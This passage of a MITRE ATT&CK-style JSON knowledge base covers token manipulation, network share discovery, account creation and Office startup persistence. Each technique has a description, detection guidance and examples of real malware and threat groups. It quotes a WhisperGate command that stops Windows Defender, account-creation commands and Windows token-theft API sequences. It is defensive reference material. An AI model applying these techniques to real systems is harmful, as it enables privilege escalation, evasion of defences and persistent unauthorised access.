    "Description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e.Token Impersonation/Theft) or used to spawn a new process (i.e.Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.[1]Any standard user can use therunascommand, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
    "Detects": [
      "Monitor for changes made to AD settings that may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls.",
      "Monitor executed commands and arguments for token manipulation by auditing command-line activity. Specifically, analysts should look for use of therunascommand. Detailed command-line logging is not enabled by default in Windows.[31]",
      "Monitor for API calls, loaded by a payload, for token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. There are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g.,LogonUser[32],DuplicateTokenEx[33], andImpersonateLoggedOnUser[34]). Please see the referenced Windows API pages for more information.",
      "Monitor for executed processes that may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls.",
      "Query systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.[35]Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.",
      "Monitor for contextual data about an account, which may include a username, user ID, environmental data, etc. that may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls."
    ],
    "Procedure Examples": [
      "AppleSeedcan gain system level privilege by passingSeDebugPrivilegeto theAdjustTokenPrivilegeAPI.[2]",
      "BlackCathas the ability modify access tokens.[3][4]",
      "Blue Mockingbirdhas used JuicyPotato to abuse theSeImpersonatetoken privilege to escalate from web application pool accounts to NT Authority\\SYSTEM.[5]",
      "DuringC0017,APT41used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for localNT AUTHORITY\\SYSTEMprivilege escalation.[6]",
      "Cubahas usedSeDebugPrivilegeandAdjustTokenPrivilegesto elevate privileges.[7]",
      "Duquexamines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.[8]",
      "Empirecan usePowerSploit'sInvoke-TokenManipulationto manipulate access tokens.[9]",
      "FIN6has used has used Metasploit’s named-pipe impersonation technique to escalate privileges.[10]",
      "Gelsemiumcan use token manipulation to bypass UAC on Windows7 systems.[11]",
      "HermeticWipercan useAdjustTokenPrivilegesto grant itself privileges for debugging withSeDebugPrivilege, creating backups withSeBackupPrivilege, loading drivers withSeLoadDriverPrivilege, and shutting down a local system withSeShutdownPrivilege.[12][13]",
      "Hydraqcreates a backdoor through which remote attackers can adjust token privileges.[14]",
      "KillDiskhas attempted to get the access token of a process by callingOpenProcessToken. IfKillDiskgets the access token, then it attempt to modify the token privileges withAdjustTokenPrivileges.[15]",
      "Lotus Blossomhas retrieved process tokens for processes to adjust the privileges of the launch process or other items.[16]",
      "Mafaldacan useAdjustTokenPrivileges()to elevate privileges.[17]",
      "MegaCortexcan enableSeDebugPrivilegeand adjust token privileges.[18]",
      "PoshC2can use Invoke-TokenManipulation for manipulating tokens.[19]",
      "PowerSploit'sInvoke-TokenManipulationExfiltration module can be used to manipulate tokens.[20][21]",
      "Ryukhas attempted to adjust its token privileges to have theSeDebugPrivilege.[22]",
      "Sagerunexfinds theexplorer.exeprocess after execution and uses it to change the token of its executing thread.[23]",
      "Sliverhas the ability to manipulate user tokens on targeted Windows systems.[24][25]",
      "SslMMcontains a feature to manipulate process privileges and tokens.[26]",
      "SUNSPOTmodified its security token to grants itself debugging privileges by addingSeDebugPrivilege.[27]"
    ]
  },
  "T1134.001": {
    "Name": "Access Token Manipulation:Token Impersonation/Theft",
    "Description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token usingDuplicateTokenorDuplicateTokenEx.[1]The token can then be used withImpersonateLoggedOnUserto allow the calling thread to impersonate a logged on user's security context, or withSetThreadTokento assign the impersonated token to a thread.An adversary may performToken Impersonation/Theftwhen they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionallyCreate Process with TokenusingCreateProcessWithTokenWorCreateProcessAsUserW.Token Impersonation/Theftis also distinct fromMake and Impersonate Tokenin that it refers to duplicating an existing token, rather than creating a new one.",
    "Detects": [
      "Monitor executed commands and arguments to detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command. Detailed command-line logging is not enabled by default in Windows.[26]",
      "Monitor for API calls associated with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators, such as DuplicateToken(Ex), ImpersonateLoggedOnUser , and SetThreadToken."
    ],
    "Procedure Examples": [
      "APT28has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.[2]",
      "Aria-bodyhas the ability to duplicate a token from ntprint.exe.[3]",
      "BADHATCHcan impersonate alsass.exeorvmtoolsd.exetoken.[4]",
      "BitPaymercan use the tokens of users to create processes on infected systems.[5]",
      "Cobalt Strikecan steal access tokens from exiting processes.[6][7]",
      "Emotethas the ability to duplicate the user’s token.[8]For example,Emotetmay use a variant of Google’s ProtoBuf to send messages that specify how code will be executed.[9]",
      "FIN8has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.[10][11]",
      "FinFisheruses token manipulation with NtFilterToken as part of UAC bypass.[12][13]",
      "DuringHomeLand Justice, threat actors used custom tooling to acquire tokens usingImpersonateLoggedOnUser/SetThreadToken.[14]",
      "Okrumcan impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API.[15]",
      "Pupycan obtain a list of SIDs and provide the option for selecting process tokens to impersonate.[16]",
      "REvilcan obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user.[17]",
      "Shamooncan impersonate tokens usingLogonUser,ImpersonateLoggedOnUser, andImpersonateNamedPipeClient.[18]",
      "SILENTTRINITYcan find a process owned by a specific user and impersonate the associated token.[19]",
      "Siloscapeimpersonates the main thread ofCExecSvc.exeby callingNtImpersonateThread.[20]",
      "Stuxnetattempts to impersonate an anonymous token to enumerate bindings in the service control manager.[21]",
      "Tarraskleverages token theft to obtainlsass.exesecurity permissions.[22]"
    ]
  },
  "T1134.002": {
    "Name": "Access Token Manipulation:Create Process with Token",
    "Description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such asCreateProcessWithTokenWandrunas.[1]Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated viaToken Impersonation/Theftor created viaMake and Impersonate Tokenbefore being used to create a process.While this technique is distinct fromToken Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",
    "Detects": [
      "Monitor executed commands and arguments to detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command or similar artifacts. Detailed command-line logging is not enabled by default in Windows.[19]",
      "Monitor for API calls associated with detecting token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior. Analysts can also monitor for use of Windows APIs such asCreateProcessWithTokenWand correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators."
    ],
    "Procedure Examples": [
      "Aria-bodyhas the ability to execute a process usingrunas.[2]",
      "Azorultcan call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges.[3]",
      "Bankshotgrabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.[4]",
      "Empirecan useInvoke-RunAsto make tokens.[5]",
      "KONNIhas duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user.[6][7]",
      "Lazarus Groupkeylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API callCreateProcessAsUserAunder that user's context.[8][9]",
      "PipeMoncan attempt to gain administrative privileges using token impersonation.[10]",
      "PoshC2can use Invoke-RunAs to make tokens.[11]",
      "REvilcan launch an instance of itself with administrative rights using runas.[12]",
      "TurlaRPC backdoors can impersonate or steal process tokens before executing commands.[13]",
      "TheWhisperGatethird stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via%TEMP%\\AdvancedRun.exe\" /EXEFilename \"C:\\Windows\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run.[14]",
      "ZxShellhas a command called RunAs, which creates a new process as another user or process context.[15]"
    ]
  },
  "T1134.003": {
    "Name": "Access Token Manipulation:Make and Impersonate Token",
    "Description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using theLogonUserfunction.[1]The function will return a copy of the new session's access token and the adversary can useSetThreadTokento assign the token to a thread.This behavior is distinct fromToken Impersonation/Theftin that this refers to creating a new user token instead of stealing or duplicating an existing one.",
    "Detects": [
      "Monitor executed commands and arguments to detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the runas command or similar artifacts. Detailed command-line logging is not enabled by default in Windows.[10]",
      "Monitor for API calls associated with detecting token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior, such as LogonUser and SetThreadToken. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators"
    ],
    "Procedure Examples": [
      "BlackByteconstructed a valid authentication token following Microsoft Exchange exploitation to allow for follow-on privileged command execution.[2]",
      "Cobalt Strikecan make tokens from known credentials.[3]",
      "FIN13has utilized tools such as Incognito V2 for token manipulation and impersonation.[4]",
      "Mafaldacan create a token for a different user.[5]",
      "SILENTTRINITYcan make tokens from known credentials.[6]"
    ]
  },
  "T1134.004": {
    "Name": "Access Token Manipulation:Parent PID Spoofing",
    "Description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via theCreateProcessAPI call, which supports a parameter that defines the PPID to use.[1]This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically viasvchost.exeorconsent.exe) rather than the current user context.[2]Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID ofPowerShell/Rundll32to beexplorer.exerather than an Office document delivered as part ofSpearphishing Attachment.[3]This spoofing could be executed viaVisual Basicwithin a malicious Office document or any code that can performNative API.[4][3]Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such aslsass.exe), causing the new process to be elevated via the inherited access token.[5]",
    "Detects": [
      "Monitor for API calls to CreateProcess/CreateProcessA, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information[11]). Malicious use of CreateProcess/CreateProcessA may also be proceeded by a call to UpdateProcThreadAttribute, which may be necessary to update process creation attributes.[12]This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.",
      "Monitor for newly constructed processes and/or command-lines that may abuse mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe",
      "Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.[3]"
    ],
    "Procedure Examples": [
      "Cobalt Strikecan spawn processes with alternate PPIDs.[6][7]",
      "DarkGaterelies on parent PID spoofing as part of its \"rootkit-like\" functionality to evade detection via Task Manager or Process Explorer.[8]",
      "KONNIhas used parent PID spoofing to spawn a newcmdprocess usingCreateProcessWand a handle toTaskmgr.exe.[9]",
      "PipeMoncan use parent PID spoofing to elevate privileges.[10]"
    ]
  },
  "T1134.005": {
    "Name": "Access Token Manipulation:SID-History Injection",
    "Description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.[1]An account can hold additional SIDs in the SID-History Active Directory attribute[2], allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).With Domain Administrator (or equivalent) rights, harvested or well-known SID values[3]may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such asRemote Services,SMB/Windows Admin Shares, orWindows Remote Management.",
    "Detects": [
      "Monitor for changes to account management events on Domain Controllers for successful and failed changes to SID-History.[10][11]",
      "Monitor for API calls, such as PowerShell's Get-ADUser cmdlet or Windows API DsAddSidHistory function,  to examine data in user’s SID-History attributes, especially users who have SID-History values from the same domain.",
      "Examine data in user’s SID-History attributes"
    ],
    "Procedure Examples": [
      "Empirecan add a SID-History to a user if on a domain controller.[4]",
      "Mimikatz'sMISC::AddSidmodule can append any SID or user/group account to a user's SID-History.Mimikatzalso utilizesSID-History Injectionto expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.[5][6]"
    ]
  },
  "T1135": {
    "Name": "Network Share Discovery",
    "Description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.File sharing over a Windows network occurs over the SMB protocol.[1][2]Netcan be used to query a remote system for available shared drives using thenet view \\\\remotesystemcommand. It can also be used to query shared drives on the local system usingnet share. For macOS, thesharing -lcommand lists all shared points used for smb services.",
    "Detects": [
      "Monitor executed commands and arguments that may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.",
      "Monitor for API calls that may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.",
      "Monitor for newly executed processes that may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement."
    ],
    "Procedure Examples": [
      "Akiracan identify remote file shares for encryption.[3]",
      "APT1listed connected network shares.[4]",
      "APT32used thenet viewcommand to show all shares available, including the administrative shares such asC$andADMIN$.[5]",
      "APT38has enumerated network shares on a compromised host.[6]",
      "APT39has used the post exploitation toolCrackMapExecto enumerate network shares.[7]",
      "APT41used thenet sharecommand as part of network reconnaissance.[8][9]",
      "Avaddonhas enumerated shared folders and mapped volumes.[10]",
      "AvosLockerhas enumerated shared drives on a compromised network.[11][12]",
      "Babukhas the ability to enumerate network shares.[13]",
      "Bad Rabbitenumerates open SMB shares on internal victim networks.[14]",
      "BADHATCHcan check a user's access to the C$ share on a compromised machine.[15]",
      "Bazarcan enumerate shared drives on the domain.[16]",
      "BitPaymercan search for network shares on the domain or workgroup usingnet view.[17]",
      "BlackByteenumerated network shares on victim devices.[18]",
      "BlackByte 2.0 Ransomwarecan identify network shares connected to the victim machine.[19]",
      "BlackByte Ransomwarecan identify network shares connected to the victim machine.[20]",
      "BlackCathas the ability to discover network shares on compromised networks.[21][22]",
      "DuringC0015, the threat actors executed the PowerView ShareFinder module to identify open shares.[23]",
      "Chimerahas usednet shareandnet viewto identify network shares of interest.[24]",
      "Clamblinghas the ability to enumerate network shares.[25]",
      "Clopcan enumerate network shares.[26]",
      "Cobalt Strikecan query shared drives on the local system.[27]",
      "Contican enumerate remote open SMB network shares usingNetShareEnum().[28][29]",
      "CrackMapExeccan enumerate the shared folders and associated permissions for a targeted network.[30]",
      "Cubacan discover shared resources using theNetShareEnumAPI call.[31]",
      "DarkVishnyascanned the network for public shared folders.[32]",
      "DEATHRANSOMhas the ability to use loop operations to enumerate network resources.[33]",
      "Diavolhas aENMDSKScommand to enumerates available network shares.[34]",
      "Dragonflyhas identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.[35]",
      "DUSTTRAPcan identify and enumerate victim system network shares.[36]",
      "Emotethas enumerated non-hidden network shares usingWNetEnumResourceW.[37]",
      "Empirecan find shared drives on the local system.[38]",
      "FIN13has executed net view commands for enumeration of open shares on compromised machines.[39][40]",
      "FIVEHANDScan enumerate network shares and mounted drives on a network.[41]",
      "Flagprohas been used to executenet viewto discover mapped network shares.[42]",
      "HELLOKITTYhas the ability to enumerate network resources.[33]",
      "IcedIDhas used thenet view /allcommand to show available shares.[43]",
      "INC Ransomhas used Internet Explorer to view folders on other systems.[44]",
      "INC Ransomwarehas the ability to check for shared network drives to encrypt.[45]",
      "InvisiMolecan gather network share information.[46]",
      "Koadiccan scan local network for open SMB.[47]",
      "KOPILUWAKcan usenetstatandNetto discover network shares.[48]",
      "Kwampirscollects a list of network shares with the commandnet share.[49]",
      "Latrodectuscan runC:\\Windows\\System32\\cmd.exe /c net view /allto discover network shares.[50][51]",
      "Leviathanscanned and enumerated remote network shares in victim environments duringLeviathan Australian Intrusions.[52]",
      "LockBit 2.0can discover remote shares.[53]",
      "LockBit 3.0can identify network shares on compromised systems.[54]",
      "LunarWebcan identify shared resources in compromised environments.[55]",
      "MURKYTOPhas the capability to retrieve information about shares on remote hosts.[56]",
      "Thenet view \\remotesystemandnet sharecommands inNetcan be used to find shared drives and directories on remote and local systems respectively.[57]",
      "Olympic Destroyerwill attempt to enumerate mapped network shares to later attempt to wipe all files on those shares.[58]",
      "DuringOperation CuckooBees, the threat actors used thenet sharecommand as part of their advanced reconnaissance.[59]",
      "DuringOperation Wocao, threat actors discovered network disks mounted to the system usingnetstat.[60]",
      "OSInfodiscovers shares on the network[61]",
      "PlugXhas a module to enumerate network shares.[62]",
      "Pupycan list local and remote shared drives and folders over SMB.[63]",
      "QakBotcan usenet shareto identify network shares for use in lateral movement.[64][65]",
      "QuietSievecan identify and search networked drives for specific file name extensions.[66]",
      "Ramsaycan scan for network drives which may contain documents for collection.[67][68]",
      "RansomHubhas the ability to target specific network shares for encryption.[69]",
      "Royalcan enumerate the shared resources of a given IP addresses using the API callNetShareEnum.[70]",
      "Sardonichas the ability to execute thenet viewcommand.[71]",
      "ShimRatcan enumerate connected drives for infected host machines.[72]",
      "SILENTTRINITYcan enumerate shares on a compromised host.[73]",
      "Sowbuglisted remote shared drives that were accessible from a victim.[74]",
      "Stuxnetenumerates the directories of a network resource.[75]",
      "Tonto Teamhas used tools such asNBTscanto enumerate network shares.[76]",
      "TrickBotmodule shareDll/mshareDll discovers network shares via the WNetOpenEnumA API.[77][78]",
      "Tropic Trooperusednetviewto scan target systems for shared resources.[79]",
      "WastedLockercan identify network adjacent and accessible drives.[80]",
      "WhisperGatecan enumerate connected remote logical drives.[81]",
      "Wizard Spiderhas used the \"net view\" command to locate mapped network shares.[82]",
      "Zebrocyidentifies network drives when they are added to victim systems.[83]"
    ]
  },
  "T1136": {
    "Name": "Create Account",
    "Description": "Adversaries may create an account to maintain access to victim systems.[1]With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",
    "Detects": [
      "Monitor executed commands and arguments for actions that are associated with account creation, such as net user or useradd",
      "Monitor newly executed processes associated with account creation, such as net.exe",
      "Monitor for newly constructed user accounts through account audits to detect suspicious accounts that may have been created by an adversary. Collect data on account creation within a network or Windows Event ID 4720 (for when a user account is created on a Windows system and domain controller)."
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamadded a login to a SQL Server withsp_addlinkedsrvlogin.[2]",
      "Indrik Spiderusedwmic.exeto add a new user to the system.[1]",
      "LockBit 2.0has been observed creating accounts for persistence using simple names like \"a\".[3]",
      "Salt Typhoonhas created Linux-level users on compromised network devices through modification of/etc/shadowand/etc/passwd.[4]",
      "Scattered Spidercreates new user identities within the compromised organization.[5]"
    ]
  },
  "T1136.001": {
    "Name": "Create Account:Local Account",
    "Description": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.For example, with a sufficient level of access, the Windowsnet user /addcommand can be used to create a local account.  In Linux, theuseraddcommand can be used, while on macOS systems, thedscl -createcommand can be used. Local accounts may also be added to network devices, often via commonNetwork Device CLIcommands such asusername, to ESXi servers viaesxcli system account add, or to Kubernetes clusters using thekubectlutility.[1][2]Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
    "Detects": [
      "Monitor executed commands and arguments for actions that are associated with local account creation, such asnet user /add,useradd,dscl -create,esxcli system account add, andkubectl create serviceaccount.",
      "Monitor newly executed processes associated with account creation, such as net.exeAnalytic 1 - Create local admin accounts using net.exe(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") (Image= C:\\Windows\\System32\\net.exe OR Image= C:\\Windows\\System32\\net1.exe ) AND CommandLine = * -exportPFX * )",
      "Monitor for newly constructed user and service accounts through account audits to detect suspicious accounts that may have been created by an adversary. Collect data on account creation within a network, a Kubernetes cluster, or Windows Event ID 4720 (for when a user account is created on a Windows system and domain controller)."
    ],
    "Procedure Examples": [
      "APT3has been known to create or enable accounts, such assupport_388945a0.[3]",
      "APT39has created accounts on multiple compromised hosts to perform actions within the network.[4]",
      "APT41has created user accounts.[5]",
      "APT5has created Local Administrator accounts to maintain access to systems with short-cycle credential rotation.[6]",
      "Calistohas the capability to add its own account to the victim's machine.[7]",
      "Carbanakcan create a Windows account.[8]",
      "Daggerflycreated a local account on victim machines to maintain access.[9]",
      "DarkGatecreates a local user account,SafeMode, vianet usercommands.[10]",
      "Dragonflyhas created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.[11]",
      "Empirehas a module for creating a local user if permissions allow.[12]",
      "FIN13has created MS-SQL local accounts in a compromised network.[13]",
      "Flamecan create backdoor accounts with login \"HelpAssistant\" on domain connected systems if appropriate rights are available.[14][15]",
      "Fox Kittenhas created a local user account with administrator privileges.[16]",
      "GoldenSpycan create new users on an infected system.[17]",
      "HiddenWaspcreates a user account as a means to provide initial persistence to the compromised machine.[18]",
      "Hildegardhas created a user named \"monerodaemon\".[19]",
      "Indrik Spiderhas created local system accounts and has added the accounts to privileged groups.[20]",
      "Kimsukyhas created accounts withnet user.[21]",
      "Leafminerused a tool called Imecab to set up a persistent remote access account on the victim machine.[22]",
      "Magic Houndhas created local accounts namedhelpandDefaultAccounton compromised machines.[23][24]",
      "Mis-Typemay create a temporary user on the system namedLost_{Unique Identifier}.[25]",
      "Thenet user username \\passwordcommands inNetcan be used to create a local account.[26]",
      "Pupycan user PowerView to execute \"net user\" commands and create local system accounts.[27]",
      "S-Typemay create a temporary user on the system namedLost_{Unique Identifier}with the passwordpond~!@6\"{Unique Identifier}.[25]",
      "ServHelperhas created a new user named \"supportaccount\".[28]",
      "SMOKEDHAMhas created user accounts.[29]",
      "TeamTNThas created local privileged users on victim machines.[30]",
      "Wizard Spiderhas created local administrator accounts to maintain persistence in compromised networks.[31]",
      "ZxShellhas a feature to create local user accounts.[32]"
    ]
  },
  "T1136.002": {
    "Name": "Create Account:Domain Account",
    "Description": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, thenet user /add /domaincommand can be used to create a domain account.[1]Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
    "Detects": [
      "Monitor executed commands and arguments for actions that are associated with local account creation, such as net user /add /domain.",
      "Monitor newly executed processes associated with account creation, such as net.exe",
      "Monitor for newly constructed user accounts through account audits to detect suspicious accounts that may have been created by an adversary. Collect data on account creation within a network or Windows Event ID 4720 (for when a user account is created on a Windows system and domain controller)."
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teamcreated privileged domain accounts to be used for further exploitation and lateral movement.[2]",
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamcreated two new accounts, \"admin\" and \"система\" (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges.[3]",
      "BlackBytecreated privileged domain accounts during intrusions.[4]",
      "Empirehas a module for creating a new domain user if permissions allow.[5]",
      "GALLIUMcreated high-privileged domain user accounts to maintain access to victim networks.[6][7]",
      "HAFNIUMhas created domain accounts.[8][9]",
      "Thenet user username \\password \\domaincommands inNetcan be used to create a domain account.[1]",
      "PsExechas the ability to remotely create accounts on target systems.[10]",
      "Pupycan user PowerView to execute \"net user\" commands and create domain accounts.[11]",
      "Wizard Spiderhas created and used new accounts within a victim's Active Directory environment to maintain persistence.[12]"
    ]
  },
  "T1136.003": {
    "Name": "Create Account:Cloud Account",
    "Description": "Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.[1][2][3][4][5]In addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.[6]In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts forTemporary Elevated Cloud Access.[7]While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.[8][9]Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by addingAdditional Cloud Credentialsor assigningAdditional Cloud Roles.",
    "Detects": [
      "Monitor for newly constructed user accounts through the collection of usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts, such as accounts that do not follow specified naming conventions or accounts created by unapproved users or sources.[13]Monitor for newly created admin accounts that go over a certain threshold of known admins.Analytic 1 - Unusual ActorPrincipalNames, creation of accounts with suspicious propertiesindex=\"azure_ad_audit_logs\" Category=\"UserManagement\" Activity=\"Add user\"| search ActorPrincipalName=\"*\" AND IPAddress!=\"expected_ip\"| table Time, ActorPrincipalName, IPAddress, Target1UserPrincipalName, Target1DisplayName"
    ],
    "Procedure Examples": [
      "AADInternalscan create new Azure AD users.[10]",
      "APT29can create new users through Azure AD.[11]",
      "LAPSUS$has created global admin accounts in the targeted organization's cloud instances to gain persistence.[12]"
    ]
  },
  "T1137": {
    "Name": "Office Application Startup",
    "Description": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.[1]These persistence mechanisms can work within Outlook or be used through Office 365.[2]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may leverage Microsoft Office-based applications for persistence between startups. SensePost, whose toolRulercan be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.[11]",
      "Monitor executed commands and arguments that may leverage Microsoft Office-based applications for persistence between startups. Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.[12]SensePost, whose toolRulercan be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.[11]",
      "Monitor for newly constructed files that may leverage Microsoft Office-based applications for persistence between startups.",
      "Monitor for changes made to files that may leverage Microsoft Office-based applications for persistence between startups.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process.",
      "Monitor newly executed processes that may leverage Microsoft Office-based applications for persistence between startups. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.",
      "Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.[13][14]",
      "Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.[13][14]"
    ],
    "Procedure Examples": [
      "APT32have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence.[3][4]",
      "Gamaredon Grouphas inserted malicious macros into existing documents, providing persistence when they are reopened.Gamaredon Grouphas loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the/altvbaoption, once the Application.Startup event is received.[5]"
    ]
  },
  "T1137.001": {
    "Name": "Office Application Startup:Office Template Macros",
